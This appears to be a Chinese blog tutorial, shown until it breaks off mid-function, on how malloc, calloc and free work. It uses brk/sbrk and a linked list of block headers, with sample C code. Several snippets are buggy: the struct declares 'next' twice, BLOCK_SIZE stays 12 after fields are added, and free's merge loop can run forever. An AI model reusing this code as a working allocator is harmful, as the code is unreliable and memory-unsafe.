        <content type="html"><![CDATA[<p>任何一个对C稍稍有了解的人都知道malloc、calloc、free。前面两个是用户态在堆上分配一段连续（虚拟地址）的内存空间，然后可以通过free释放，但是，同时也会有很多人对其背后的实现机制不了解。这篇文章则是通过介绍这三个函数，并简单的予以实现，对比现有C的标准库实现（glibc等）相比，并不是特别高效，我们重在阐述背后的基本原理。</p><p><strong>一、C程序的存储空间布局</strong></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic1.zhimg.com/80/v2-89eca99a6848e8e0433f2fbc3e9bef30_720w.jpg"></p><ul><li>text：整个用户空间的最低地址部分，存放的是指令（程序所编译成的可执行机器码）。可共享，即使是频繁操作执行的程序，在存储器中也只需有一个副本，通常是只读的。</li><li>initializeddata(data)：存放初始化过的全局变量，包含了程序中需明确地赋初值的变量。</li><li>uninitializeddata(bss)：存放的是未初始化过的全局变量，在程序开始执行之前，内核将此段中的数据初始化为0或者NULL。</li><li>heap：堆，自低地址向高地址增长，后面重点剖析</li><li>stack：栈，自高地址向低地址增长，自动变量以及每次函数调用时所需保存的信息都存放在此段中。</li></ul><p><strong>二、Heap 内存模型</strong></p><p>一般来说，malloc所申请的内存主要从heap区域分配的。 <a href="https://link.zhihu.com/?target=http%3A//blog.csdn.net/wenqian1991/article/details/25159545">linux内存管理</a>，从这里可以了解到linux下虚拟地址与物理地址。</p><p>linux对堆的管理如下：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic1.zhimg.com/80/v2-e8b63ad7142e564f45b5d9c5fb0a2850_720w.jpg"></p><p>linux内核维护一个break指针，这个指针指向堆空间的某个地址。从堆起始地址（Heap’sStart）到break之间的地址空间为映射好的（虚拟地址与物理地址的映射，通过MMU实现），可以供进程访问；而从break往上，是未映射的地址空间，如果访问这段空间则程序会报错。</p><p>所以，如果Mapped Region空间不够时，会调整break指针，扩大映射空间，重新分配内存。</p><p><strong>三、调整break：brk()和sbrk()</strong></p><p>最初break的位置正好位于bss端末尾之后，看图1，在break指针的位置升高时，程序可以访问新分配区域内的任何内存地址，而此时物理内存页尚未分配，内存会在京城首次试图访问这些虚拟内存地址时自动分配新的物理内存页。</p><p>linux通过brk和sbrk系统调用操作break指针：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">brk</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">sbrk</span><span class="token punctuation">(</span>intptr_t increment<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>brk()</code> 将<code>break</code>指针设置为 <code>addr</code>所指定的位置，由于虚拟内存以页为单位进行分配，<code>addr</code>实际会四舍五入到下一个内存也的边界处。由于<code>brk</code>是直接指定一个地址，所以一旦这个值取得过低，有可能导致不可预知的行为，对照上图，<code>brk</code>只能在指定的区域内调整<code>break</code>。</p><p><code>sbrk()</code> 将<code>break</code>指针在原有地址增加从参数<code>increment</code>传入的大小（linux中，sbrk是基于brk基础上实现的一个库函数），用于声明<code>increment</code>的<code>intptr_t</code> 类型属于整数数据类型。若调用成功，<code>sbrk()</code> 返回前一个<code>break</code>的地址，换言之，如果<code>break</code>增加，那么返回值是指向这块新分配内存起始位置的指针。<code>sbrk(0)</code>将得到当前<code>break</code>指针的位置。</p><p>系统对每一个进程所分配的资源不是无限的，包括可映射的内存空间，图2，未映射内存的尾端有个<code>rlimit</code>表示当前进程可用的资源上限。</p><p><strong>三、malloc</strong></p><p>根据标准C库函数的定义，malloc 具有如下模型：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数要实现的功能是在系统中分配一段连续的可用的内存，具体有如下要求：</p><ul><li>malloc分配的内存大小至少为size参数所指定的字节数</li><li>malloc的返回值是一个指针，指向一段可用内存的起始地址</li><li>多次调用malloc所分配的地址不能有重叠部分，除非该地址已经被释放掉</li><li>malloc应该尽快完成内存分配并返回（不能使用<a href="https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/NP-hardness">NP-hard</a>的内存分配算法）</li><li>实现malloc时，应该同时实现内存大小调整和内存释放函数（calloc和free）-malloc分配失败时必须返回NULL</li></ul><p>malloc返回内存块所采用的字节对齐方式，总是适宜于高效访问任何类型的C语言数据结构。</p><p><strong>四、初探实现malloc：</strong></p><p>我们假定整个内存处于初始状态，即break指针位于bss段的单位，整个heap都是UnmappedRegion。（图2）基于此，我们可以实现一个简单但毫无实际价值的malloc：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    p <span class="token operator">=</span> <span class="token function">sbrk</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个<code>malloc</code>就是从未映射区域直接划出一块，但是<code>malloc</code>对这块已分配的内存缺乏记录，不便于内存释放。</p><p><strong>五、正式实现malloc</strong></p><p>上面说到分配的内存没有记录，一旦调用<code>free</code>释放，<strong>free</strong>不知道它到底要释放多大的内存，所以我们需要额外一个数据结构来记录这些信息。</p><p><strong>5.1、数据结构</strong>一个简单可行方案是将堆内存以块的形式组织起来，每个块（block）由meta区和数据区组成，meta去记录数据块的元信息（数据块大小、空闲标志位、指针等），数据区则是真实分配的内存区域，并且数据区的第一个字节地址即为malloc返回的地址。</p><p>可用如下结构体定义一个<code>block</code>：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">s_block</span> <span class="token operator">*</span>t_block<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">s_block</span> <span class="token punctuation">{</span>    size_t size<span class="token punctuation">;</span>    t_block next<span class="token punctuation">;</span>    <span class="token keyword">int</span> free<span class="token punctuation">;</span>    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-c9856e521c9441ca74b853c6110f73c1_720w.jpg"></p><p>那么用这个结构体来分配内存，而不用malloc则是下面一番场景：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">t_block b<span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token function">sbrk</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sbrk</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">s_block</span><span class="token punctuation">)</span> <span class="token operator">+</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">-&gt;</span>size <span class="token operator">=</span> size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.2、寻找合适的block</strong></p><p>我们从堆的起始地址开始查找第一个符合要求的<code>block</code>，并返回<code>block</code>起始地址，如果找不到就返回<code>NULL</code>；</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">t_block <span class="token function">find_block</span><span class="token punctuation">(</span>t_block <span class="token operator">*</span>last<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>    t_block b <span class="token operator">=</span> base<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>free <span class="token operator">&amp;&amp;</span> b<span class="token operator">-&gt;</span>size <span class="token operator">&gt;=</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token operator">*</span>last <span class="token operator">=</span> b<span class="token punctuation">;</span>        b <span class="token operator">=</span> b<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里<code>base</code>是一个全局变量，维护整个堆的起始地址。另外，这里在遍历时会更新一个<code>last</code>指针，这个指针始终指向当前遍历的<code>block</code>，如果找不到合适的<code>block</code>，那么<code>malloc</code>将很容易的开辟新的<code>block</code>使用。</p><p><strong>5.3、开辟新的block</strong></p><p>如果现有<strong>block</strong>都不能满足需求，则需要在链表最后开辟一个新的block。最简单的方式就是利用sbrk升高break位置然后对其初始化，然后更新对应block指针，将其add到链表最后。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">t_block <span class="token function">extend_heap</span><span class="token punctuation">(</span>t_block last<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>    t_block b<span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token function">sbrk</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sbrk</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">s_block</span><span class="token punctuation">)</span> <span class="token operator">+</span> size<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    b<span class="token operator">-&gt;</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    b<span class="token operator">-&gt;</span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>last<span class="token punctuation">)</span>        last<span class="token operator">-&gt;</span>next <span class="token operator">=</span> b<span class="token punctuation">;</span>    b<span class="token operator">-&gt;</span>free <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.4、分裂block</strong> 看前面 <code>find_block()</code>的实现，如果我们申请的 <code>size</code> 远小于查找到的<code>block</code>。（这种情况是可能，它是查到第一个满足条件（大小，可用）的block），这样会导致较大内部碎片的产生。所以，应该在剩余数据区足够大的情况下，将其分裂成一个新的block：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-f75ee142d5ed002b7026cf0219fde822_720w.jpg"></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">split_block</span><span class="token punctuation">(</span>t_block b<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>    t_block <span class="token keyword">new</span><span class="token punctuation">;</span>    <span class="token keyword">new</span> <span class="token operator">=</span> b<span class="token operator">-&gt;</span>data <span class="token operator">+</span> size<span class="token punctuation">;</span>    <span class="token keyword">new</span><span class="token operator">-&gt;</span>size <span class="token operator">=</span> b<span class="token operator">-&gt;</span>size <span class="token operator">-</span> size <span class="token operator">-</span> BLOCK_SIZE<span class="token punctuation">;</span>    <span class="token keyword">new</span><span class="token operator">-&gt;</span>next <span class="token operator">=</span> b<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>    <span class="token keyword">new</span><span class="token operator">-&gt;</span>free <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    b<span class="token operator">-&gt;</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    b<span class="token operator">-&gt;</span>next <span class="token operator">=</span> <span class="token keyword">new</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看了上面一大串，是不是跟伙伴算法很像。但是这里的分裂block函数，得视情况调用，如果申请的size&lt;block-&gt;size，但是又不是小太多，如果分裂block的话，会导致分裂后剩余未分配出去的数据块过小，无法满足其余需求，很容易形成内存碎片。</p><p>所以，伙伴算法有更高效的处理（实际上伙伴算法也会产生内部碎片）。</p><p><strong>5.5、malloc 的实现</strong></p><p>铺垫做了那么多，我们可以利用它们整合成一个简单可用的malloc。首先定义一个block链表的头指针，初始化为NULL，另外，我们需要剩余空间至少有<code>BLOCK_SIZE + 4</code> 才执行分离操作。</p><p>此外，一开始我们讲到，<code>malloc</code>对分配的内存大小也有要求，是按4字节对齐，所以申请的size不为4的倍数时，我们需要将其调整为大于size的最小的4的倍数。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">align4</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> </span><span class="token comment">// align to 4 bytes</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BLOCK_SIZE</span> <span class="token expression"><span class="token number">12</span> </span><span class="token comment">// 12 bytes</span></span><span class="token keyword">void</span> <span class="token operator">*</span>base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// base address of the block</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>    t_block b<span class="token punctuation">,</span> last<span class="token punctuation">;</span>    size_t s<span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token function">align4</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>base<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        last <span class="token operator">=</span> base<span class="token punctuation">;</span>        b <span class="token operator">=</span> <span class="token function">find_block</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>last<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>size <span class="token operator">-</span> s<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token punctuation">(</span>BLOCK_SIZE <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">split_block</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token operator">-&gt;</span>free <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            b <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span>last<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>b<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        b <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>b<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        base <span class="token operator">=</span> b<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> b<span class="token operator">-&gt;</span>data<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现思路很简单：首先往链表中查找合适的block，如果找到了，看是否可以分裂，如果可以就分裂；如果没有找到合适的，就开辟一个新的block；如果是第一次分配，即整个内存链表不存在，则一开始就得新开辟一个block。</p><p><strong>六、calloc 的实现</strong></p><p>先看calloc的标准库语义：函数 calloc()用于给一组相同对象分配内存。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">calloc</span><span class="token punctuation">(</span>size_t numitems<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数numitems指定分配对象的数量，size指定每个对象的大小。</p><p>calloc 与之malloc 不同之处在于，calloc会将分配后的内存空间初始化，而malloc申请的是一块未初始化的内存。所以，实现calloc，只需两步：</p><ol type="1"><li>malloc 一块内存</li><li>将数据区内容初始化为0</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">calloc</span><span class="token punctuation">(</span>size_t numitems<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>    size_t <span class="token operator">*</span><span class="token keyword">new</span><span class="token punctuation">;</span>    size_t s<span class="token punctuation">,</span> i<span class="token punctuation">;</span>    <span class="token keyword">new</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>numitems <span class="token operator">*</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        s <span class="token operator">=</span> <span class="token function">align4</span><span class="token punctuation">(</span>numitems <span class="token operator">*</span> size<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>            <span class="token keyword">new</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>七、free 的实现</strong></p><p>free 的实现并不像看上去那么简单，需要解决两个关键问题：</p><ol type="1"><li><p>如何验证所传入的地址是有效地址（malloc方式分配的）</p></li><li><p>如何解决碎片问题</p></li></ol><p><strong>7.1、先看如何解决碎片问题</strong>，就是把相邻的空闲内存合并为大的（伙伴算法类似）：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">t_block <span class="token function">fusion</span><span class="token punctuation">(</span>t_block b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>next <span class="token operator">&amp;&amp;</span> b<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>free<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        b<span class="token operator">-&gt;</span>size <span class="token operator">+=</span> BLOCK_SIZE <span class="token operator">+</span> b<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span>        b<span class="token operator">-&gt;</span>next <span class="token operator">=</span> b<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>next<span class="token punctuation">)</span>            b<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>prev <span class="token operator">=</span> b<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再看如何验证所传入的地址是有效的，位于heap内。一个解决方法是，在block结构体中添加一个 ptr指针，用于指向数据块区域，如果 b-&gt;ptr == b-&gt;data，则表示 b极有可能是一个有效block。所以我们对block数据结构进行了扩展：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">s_block</span> <span class="token punctuation">{</span>    size_t size<span class="token punctuation">;</span>    t_block next<span class="token punctuation">;</span>    <span class="token keyword">int</span> free<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">s_block</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">s_block</span> <span class="token operator">*</span>prev<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>7.2、根据给定地址得到对应的block</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">t_block <span class="token function">get_block</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span>    tmp <span class="token operator">=</span> p<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> tmp <span class="token operator">-=</span> BLOCK_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>7.3、下面则验证是不是有效的block：</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">valid_addr</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>base<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">&gt;</span> base <span class="token operator">&amp;&amp;</span> p <span class="token operator">&lt;</span> <span class="token function">sbrk</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token function">get_block</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>7.4、下面就实现free</strong></p><p>这里我们采用的合并策略是这样的：先合并相邻的空闲内存块，合并之后，再检查是否还有空闲的相邻内存块，如果有则继续合并，直到最后，该内存块是最大的连续内存块。另外，对于break指针的调整（降低），必须保证在该释放的block与Unmapped Region之间是空闲的，没有被占。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">{</span>    t_block b<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">valid_addr</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        b <span class="token operator">=</span> <span class="token function">get_block</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        b<span class="token operator">-&gt;</span>free <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>prev <span class="token operator">&amp;&amp;</span> b<span class="token operator">-&gt;</span>prev<span class="token operator">-&gt;</span>free<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            b <span class="token operator">=</span> <span class="token function">fusion</span><span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>next<span class="token punctuation">)</span>            <span class="token function">fusion</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> b<span class="token operator">-&gt;</span>next<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>prev<span class="token punctuation">)</span>                b<span class="token operator">-&gt;</span>prev<span class="token operator">-&gt;</span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>            <span class="token function">brk</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>八、realloc的实现</strong></p><p>同样先看标准库中realloc的语义：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ptr 是指向需要调整大小的内存块的指针，参数 size指定所需调整大小的期望值。</p><p>realloc()用来调整（通常是增加）一块内存的大小，而此块内存应是之前由malloc函数分配的。若realloc 增加了已分配内存块的大小，则不会对额外分配的内存进行初始化。</p><p><strong>8.1、内存块复制</strong></p><p>看了realloc的语义，我们首先得实现一个内存复制方法。如同calloc一样，我们以4字节为单位进行复制：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">copy_block</span><span class="token punctuation">(</span>t_block src<span class="token punctuation">,</span> t_block dst<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token operator">*</span>sdata<span class="token punctuation">,</span> <span class="token operator">*</span>dtata<span class="token punctuation">;</span>    size_t 